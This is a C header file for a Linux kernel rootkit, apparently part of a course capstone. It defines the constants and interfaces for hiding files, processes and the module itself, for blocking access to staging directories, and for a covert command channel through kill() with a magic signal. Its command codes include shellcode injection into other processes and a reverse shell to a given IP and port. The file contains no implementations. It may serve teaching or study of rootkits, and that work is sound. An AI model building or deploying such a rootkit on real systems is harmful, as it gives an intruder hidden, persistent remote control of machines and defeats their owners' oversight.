/*
 * rootkit.h — Shared definitions for the LKM rootkit
 *
 * Capstone: Kernel Rootkit + Exploitation
 *
 * This header defines magic numbers, command codes, and interfaces
 * for all rootkit subsystems. Included by every .c file in the module.
 */

#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/types.h>

/* ─── File hiding ─────────────────────────────────────────────────────────── */

/* Prefix for hidden files — getdents64 entries starting with this are
 * filtered from directory listings */
#define HIDDEN_PREFIX     "rk_"
#define HIDDEN_PREFIX_LEN 3

/* ─── Access blocking ─────────────────────────────────────────────────────── */

/* Directories the ftrace hook blocks — openat returns -EFAULT for any path
 * under these prefixes. The rootkit uses these as dead drops / staging areas;
 * blocking access prevents non-operator users from discovering them. */
#define HIDDEN_DIR_1      "/tmp/secret"
#define HIDDEN_DIR_2      "/dev/shm/secret"
#define MAX_PATH_LEN      256

/* ─── Process hiding ──────────────────────────────────────────────────────── */

/* Processes with this supplementary GID are hidden from /proc listings.
 * Operator processes (those with GID 1337) bypass all hiding. */
#define MAGIC_GID         1337

/* ─── Covert C2 — kill() signal hook ──────────────────────────────────────── */

/* Magic signal number — RT signal range (32–64), rarely used by real software.
 * When kill(cmd, MAGIC_SIGNAL) is called, the rootkit intercepts the call
 * and interprets the x0 register as a command code. Extended protocol uses
 * x2-x7 for additional arguments (requires mykill binary, not glibc kill). */
#define MAGIC_SIGNAL      62

/* C2 staging file — mykill writes bulk data (paths, shellcode) here,
 * then triggers via kill. Kprobe handler reads via kernel_read(). */
#define C2_STAGING_PATH   "/dev/shm/rk_cmd"

/* ─── C2 command codes ────────────────────────────────────────────────────── */

/* Basic commands (x0 = command code, x1 = MAGIC_SIGNAL): */
#define CMD_STATUS        0     /* Log current state */
#define CMD_TOGGLE_HIDE   1     /* Toggle file hiding (kretprobe) */
#define CMD_TOGGLE_BLOCK  2     /* Toggle access blocking (ftrace) */
#define CMD_TOGGLE_MODULE 3     /* Toggle module visibility */
#define CMD_TOGGLE_PROC   4     /* Toggle process hiding (kretprobe) */

/* Extended commands (x2+ carry arguments): */
#define CMD_ADD_PATH      5     /* Add path to hide list (path in C2_STAGING_PATH) */
#define CMD_ADD_GID       6     /* x2 = PID to add to GID 1337 group */
#define CMD_INJECT        7     /* x2 = target PID, shellcode path in C2_STAGING_PATH */
#define CMD_REVSHELL      8     /* x2 = port, x3 = IP (as 32-bit) */

/* ─── File hiding interface (file_hide.c) ─────────────────────────────────── */

int  file_hide_init(void);
void file_hide_exit(void);
int  file_hide_enable(void);
void file_hide_disable(void);
bool file_hide_is_active(void);

/* ─── Process hiding interface (proc_hide.c) ──────────────────────────────── */

int  proc_hide_init(void);
void proc_hide_exit(void);
int  proc_hide_enable(void);
void proc_hide_disable(void);
bool proc_hide_is_active(void);
int  proc_hide_add_pid(pid_t pid);

/* ─── Covert C2 interface (c2.c) ──────────────────────────────────────────── */

int  c2_init(void);
void c2_exit(void);

/* ─── Shellcode injection interface (inject.c) ────────────────────────────── */

int  inject_init(void);
void inject_exit(void);
int  inject_trigger(pid_t target);

#endif /* ROOTKIT_H */
